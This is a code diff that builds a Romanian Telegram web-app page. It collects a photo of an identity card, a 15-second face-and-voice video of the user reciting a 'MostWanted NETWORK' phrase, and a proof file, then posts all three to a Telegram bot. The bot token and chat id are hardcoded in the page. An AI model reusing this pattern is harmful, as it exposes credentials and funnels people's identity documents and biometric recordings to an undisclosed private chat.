@@ -1,42 +1,88 @@
-    async function startRec() {
-        // 1. Obținem fluxul direct, nu din elementul video
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // 2. Setăm fluxul și pe video pentru feedback vizual
-            document.getElementById('vid').srcObject = stream;
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #000; color: #0F0; font-family: monospace; text-align: center; }
+        .p { display: none; padding: 20px; }
+        .active { display: block; }
+        button { background: #0F0; border: none; padding: 20px; width: 100%; font-weight: bold; }
+        video, img { width: 100%; max-height: 200px; border: 1px solid #0F0; }
+    </style>
+</head>
+<body>
 
-            // 3. Verificăm codecurile
-            let mimeType = 'video/webm';
-            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-                mimeType = 'video/webm;codecs=vp9';
-            }
+<!-- PAS 1 -->
+<div id="s1" class="p active">
+    <input type="file" id="i1" accept="image/*" capture="environment" style="display:none">
+    <button onclick="document.getElementById('i1').click()">[ 1. SCANEAZĂ BULETIN ]</button>
+</div>
 
-            chunks = [];
-            rec = new MediaRecorder(stream, { mimeType: mimeType });
+<!-- PAS 2 -->
+<div id="s2" class="p">
+    <p>Rostiți: "MostWanted NETWORK, 13 Iulie 2026"</p>
+    <video id="v" autoplay playsinline muted></video>
+    <button id="b2" onclick="start()">[ 2. START ÎNREGISTRARE ]</button>
+</div>
 
-            rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-            
-            rec.onstop = () => {
-                // Oprim camera după înregistrare
-                stream.getTracks().forEach(track => track.stop());
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-            };
+<!-- PAS 3 -->
+<div id="s3" class="p">
+    <input type="file" id="i3" accept="image/*,video/*" style="display:none">
+    <button onclick="document.getElementById('i3').click()">[ 3. SELECTEAZĂ DOVADĂ ]</button>
+</div>
 
-            rec.start();
-            document.getElementById('btn2').innerText = "[ ÎNREGISTRARE ACTIVĂ ]";
-            document.getElementById('btn2').disabled = true;
+<script>
+    let f1, f3, rec, chunks = [], stream;
 
-            // Timer de 15 secunde
-            setTimeout(() => {
-                if (rec && rec.state === "recording") {
-                    rec.stop();
-                }
-            }, 15000);
+    // Pasul 1
+    document.getElementById('i1').onchange = (e) => {
+        f1 = e.target.files[0];
+        document.getElementById('s1').classList.remove('active');
+        document.getElementById('s2').classList.add('active');
+        navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(s => {
+            stream = s;
+            document.getElementById('v').srcObject = s;
+        });
+    };
 
-        } catch (err) {
-            console.error("Eroare hardware:", err);
-            alert("Eroare: Nu am putut accesa camera sau microfonul. Asigură-te că ai permis accesul!");
-        }
+    // Pasul 2
+    function start() {
+        chunks = [];
+        rec = new MediaRecorder(stream);
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = () => {
+            document.getElementById('s2').classList.remove('active');
+            document.getElementById('s3').classList.add('active');
+        };
+        rec.start();
+        document.getElementById('b2').innerText = "ÎNREGISTRARE ACTIVĂ (15s)...";
+        setTimeout(() => rec.stop(), 15000);
     }
+
+    // Pasul 3
+    document.getElementById('i3').onchange = (e) => {
+        f3 = e.target.files[0];
+        upload();
+    };
+
+    async function upload() {
+        const token = "8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk";
+        const cid = "-1003936586656";
+        
+        // Trimite pe rând: Buletin, Video, Dovadă
+        let files = [ {t:"photo", f:f1}, {t:"video", f:new Blob(chunks)}, {t:f3.type.includes('image')?"photo":"video", f:f3} ];
+        
+        for(let item of files) {
+            let fd = new FormData();
+            fd.append("chat_id", cid);
+            fd.append(item.t, item.f);
+            await fetch(`https://api.telegram.org/bot${token}/send` + (item.t=="photo"?"Photo":"Video"), {method:"POST", body:fd});
+        }
+        alert("Trimis.");
+        window.Telegram.WebApp.close();
+    }
+</script>
+</body>
+</html>
